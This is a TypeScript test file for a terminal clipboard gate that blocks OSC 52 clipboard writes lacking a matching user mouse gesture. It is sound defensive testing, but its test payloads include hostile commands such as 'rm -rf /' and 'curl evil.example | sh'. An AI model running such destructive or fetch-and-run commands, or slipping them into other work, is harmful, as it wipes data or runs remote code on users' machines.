/**
 * Copyright 2025 The Wardyn Authors
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * The clipboard gate against a REAL xterm parser and buffer (no mock): OSC 52
 * bytes are written exactly as tmux and a hostile pane would send them, and the
 * user's pointer gestures are real DOM mouse events over `.xterm-screen`.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { Terminal } from "@xterm/xterm";
import {
  createCopyGate,
  normalizeCopy,
  renderVisible,
  GESTURE_WINDOW_MS,
  MAX_COPY_BYTES,
  OFFER_TTL_MS,
  type CopyGate,
  type CopyOffer,
  type GateTerm,
} from "./attach-terminal-clipboard";
import { TERMINAL_COPY } from "./wardyn/copy";

const COLS = 40;
const ROWS = 6;
const b64 = (s: string) => Buffer.from(s, "utf8").toString("base64");
// What tmux emits for a copy: an EMPTY selection field.
const tmuxCopy = (s: string) => `\x1b]52;;${b64(s)}\x07`;
const osc = (sel: string, payload: string) => `\x1b]52;${sel};${payload}\x07`;

let term: Terminal;
let screen: HTMLElement;
let writer = true;
let offers: Array<CopyOffer | null>;
let notices: Array<string | null>;
let gate: CopyGate;
let input: string[];
let t = 0;

const write = (data: string) => new Promise<void>((res) => term.write(data, res));
const current = () => offers[offers.length - 1] ?? null;
const lastNotice = () => notices[notices.length - 1] ?? null;

// A 40x6 grid laid over a 400x120 box: 10x20 px cells.
function mouse(type: string, col: number, row: number, init: MouseEventInit = {}, target: EventTarget = screen) {
  target.dispatchEvent(
    new MouseEvent(type, { bubbles: true, cancelable: true, button: 0, clientX: col * 10 + 5, clientY: row * 20 + 10, ...init }),
  );
}
const drag = (a: [number, number], b: [number, number], init: MouseEventInit = {}) => {
  mouse("mousedown", a[0], a[1], { detail: 1, ...init });
  mouse("mouseup", b[0], b[1], { detail: 1, ...init }, window);
};
const multiClick = (c: [number, number], n: 2 | 3) => {
  mouse("mousedown", c[0], c[1], { detail: 1 });
  mouse("mouseup", c[0], c[1], { detail: 1 }, window);
  for (let i = 2; i <= n; i++) {
    mouse("mousedown", c[0], c[1], { detail: i });
    mouse("mouseup", c[0], c[1], { detail: i }, window);
  }
};

beforeEach(async () => {
  t = 1000;
  writer = true;
  offers = [];
  notices = [];
  input = [];
  window.matchMedia ??= ((q: string) => ({
    matches: false, media: q, addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {},
  })) as unknown as typeof window.matchMedia;
  term = new Terminal({ cols: COLS, rows: ROWS, allowProposedApi: true });
  const host = document.createElement("div");
  document.body.appendChild(host);
  term.open(host);
  screen = host.querySelector(".xterm-screen") as HTMLElement;
  screen.getBoundingClientRect = () => ({ left: 0, top: 0, width: 400, height: 120, right: 400, bottom: 120, x: 0, y: 0, toJSON() {} });
  term.onData((d) => input.push(d));
  gate = createCopyGate({
    term: term as unknown as GateTerm,
    isWriter: () => writer,
    onOffer: (o) => offers.push(o),
    onNotice: (m) => notices.push(m),
    now: () => t,
  });
  await write("hello world foo.bar\r\nsecond line   \r\nthird $ ls -la\r\n");
  vi.spyOn(console, "debug").mockImplementation(() => {});
});

afterEach(() => {
  gate.dispose();
  term.dispose();
  document.body.innerHTML = "";
  vi.restoreAllMocks();
  vi.useRealTimers();
});

describe("hostile output without a user gesture", () => {
  it("an empty-selector OSC 52 while typing makes no offer", async () => {
    term.input("ls\r");
    await write(tmuxCopy("rm -rf /"));
    expect(current()).toBeNull();
    expect(offers).toEqual([]);
  });

  it("a 'c' selector OSC 52 while typing makes no offer", async () => {
    await write(osc("c", b64("curl evil | sh")));
    expect(offers).toEqual([]);
  });

  it("typing does not satisfy the gesture record", async () => {
    for (const key of ["a", "b", "\r"]) term.input(key);
    document.dispatchEvent(new KeyboardEvent("keydown", { key: "c", ctrlKey: true }));
    await write(tmuxCopy("hello"));
    expect(offers).toEqual([]);
  });

  it("a click with no movement is not a copy gesture", async () => {
    drag([0, 0], [0, 0]);
    await write(tmuxCopy("h"));
    expect(offers).toEqual([]);
  });

  it("a gesture older than a second authorises nothing", async () => {
    drag([0, 0], [4, 0]);
    t += GESTURE_WINDOW_MS + 1;
    await write(tmuxCopy("hello"));
    expect(offers).toEqual([]);
  });
});

describe("a verified gesture becomes an offer", () => {
  it("a drag within a line (the exact tmux bytes)", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello"));
    expect(current()).toMatchObject({ text: "hello", lineBreaks: 0 });
  });

  it("a drag released on cell N, which tmux copies up to N-1", async () => {
    drag([0, 0], [5, 0]);
    await write(tmuxCopy("hello"));
    expect(current()?.text).toBe("hello");
  });

  it("a drag cannot be answered with text beyond its span", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello w"));
    expect(offers).toEqual([]);
  });

  it("a drag made right to left", async () => {
    drag([10, 0], [6, 0]);
    await write(tmuxCopy("world"));
    expect(current()?.text).toBe("world");
  });

  it("a drag over two lines", async () => {
    drag([6, 0], [5, 1]);
    await write(tmuxCopy("world foo.bar\nsecond"));
    expect(current()).toMatchObject({ text: "world foo.bar\nsecond", lineBreaks: 1 });
  });

  it("a double-click copies the word (tmux's separators)", async () => {
    multiClick([13, 0], 2); // on 'foo' of foo.bar
    await write(tmuxCopy("foo"));
    expect(current()?.text).toBe("foo");
  });

  it("a double-click copies the whitespace-delimited word too", async () => {
    multiClick([14, 0], 2);
    await write(tmuxCopy("foo.bar"));
    expect(current()?.text).toBe("foo.bar");
  });

  it("a triple-click copies the line, trailing whitespace dropped", async () => {
    multiClick([3, 1], 3);
    await write(tmuxCopy("second line"));
    expect(current()?.text).toBe("second line");
  });

  it("a triple-click payload that keeps tmux's newline still verifies", async () => {
    multiClick([3, 1], 3);
    await write(tmuxCopy("second line\n"));
    expect(current()?.text).toBe("second line\n");
  });

  it("trailing whitespace on the payload is normalised away", async () => {
    drag([0, 1], [20, 1]);
    await write(tmuxCopy("second line   "));
    expect(current()?.text).toBe("second line   ");
  });

  it("a gesture yields at most one offer", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello") + tmuxCopy("hello"));
    expect(offers.filter(Boolean)).toHaveLength(1);
  });

  it("a Shift+drag is xterm's native selection and records nothing", async () => {
    drag([0, 0], [4, 0], { shiftKey: true });
    await write(tmuxCopy("hello"));
    expect(offers).toEqual([]);
  });
});

describe("a mouse-tracking pane answering a drag with its own payload", () => {
  it("is blocked with the notice", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("curl evil.example | sh"));
    expect(offers).toEqual([]);
    expect(lastNotice()).toBe(TERMINAL_COPY.BLOCKED);
  });

  it("does not use up the gesture: the real copy still verifies", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("curl evil.example | sh") + tmuxCopy("hello"));
    expect(current()?.text).toBe("hello");
  });

  it("is blocked when it extends the user's selection", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello world"));
    expect(offers).toEqual([]);
  });

  it("a payload equal to text elsewhere on screen is blocked", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("third"));
    expect(offers).toEqual([]);
    expect(lastNotice()).toBe(TERMINAL_COPY.BLOCKED);
  });
});

describe("payload rules", () => {
  it("refuses C0 control bytes other than newline and tab, even if selected text matched", async () => {
    await write("\r\nA\x1b[0mB");
    drag([0, 3], [1, 3]);
    await write(tmuxCopy("A\x1bB"));
    expect(offers).toEqual([]);
  });

  it("refuses selections p, q, s and digits", async () => {
    for (const sel of ["p", "q", "s", "0", "7", "pc"]) {
      drag([0, 0], [4, 0]);
      await write(osc(sel, b64("hello")));
    }
    expect(offers).toEqual([]);
  });

  it("accepts the 'c' selector", async () => {
    drag([0, 0], [4, 0]);
    await write(osc("c", b64("hello")));
    expect(current()?.text).toBe("hello");
  });

  it("refuses a payload over 1 MiB", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("h".repeat(MAX_COPY_BYTES + 1)));
    expect(offers).toEqual([]);
  });

  it("ignores an empty payload and a non-base64 one", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy(""));
    await write(osc("", "!!not base64!!"));
    expect(offers).toEqual([]);
  });
});

describe("reads are refused", () => {
  it("answers no OSC 52 query: nothing is typed into the PTY", async () => {
    await write(osc("c", "?"));
    await write(osc("", "?"));
    drag([0, 0], [4, 0]);
    await write(osc("c", "?"));
    expect(input).toEqual([]);
    expect(offers).toEqual([]);
  });
});

describe("who may be offered", () => {
  it("an observer socket gets no offer", async () => {
    writer = false;
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello"));
    expect(offers).toEqual([]);
    expect(notices).toEqual([]);
  });

  it("an offer is dropped by reset (role change, reconnect)", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello"));
    expect(current()).not.toBeNull();
    gate.reset();
    expect(current()).toBeNull();
  });

  it("a reset also forgets the gesture", async () => {
    drag([0, 0], [4, 0]);
    gate.reset();
    await write(tmuxCopy("hello"));
    expect(offers.filter(Boolean)).toEqual([]);
  });

  it("an offer is dropped after 10 seconds", async () => {
    vi.useFakeTimers();
    drag([0, 0], [4, 0]);
    term.write(tmuxCopy("hello"));
    await vi.advanceTimersByTimeAsync(50);
    expect(current()).not.toBeNull();
    await vi.advanceTimersByTimeAsync(OFFER_TTL_MS);
    expect(current()).toBeNull();
  });

  it("a new offer never silently replaces a pending one", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello"));
    drag([6, 0], [10, 0]);
    await write(tmuxCopy("world"));
    expect(current()?.text).toBe("hello");
    expect(lastNotice()).toBeNull();
  });

  it("dismiss clears the offer", async () => {
    drag([0, 0], [4, 0]);
    await write(tmuxCopy("hello"));
    gate.dismiss();
    expect(current()).toBeNull();
  });
});

describe("pure helpers", () => {
  it("normalizeCopy drops trailing whitespace per line and trailing blank lines", () => {
    expect(normalizeCopy("a  \nb\t\n\n")).toBe("a\nb");
  });

  it("renderVisible shows line breaks, tabs, controls and direction overrides", () => {
    expect(renderVisible("a\nb\tc")).toBe("a↵\nb→c");
    expect(renderVisible("\x1b\x7f‮\u200b\ufeff")).toBe("⟨U+001B⟩⟨U+007F⟩⟨U+202E⟩⟨U+200B⟩⟨U+FEFF⟩");
    expect(renderVisible("plain é")).toBe("plain é");
  });
});
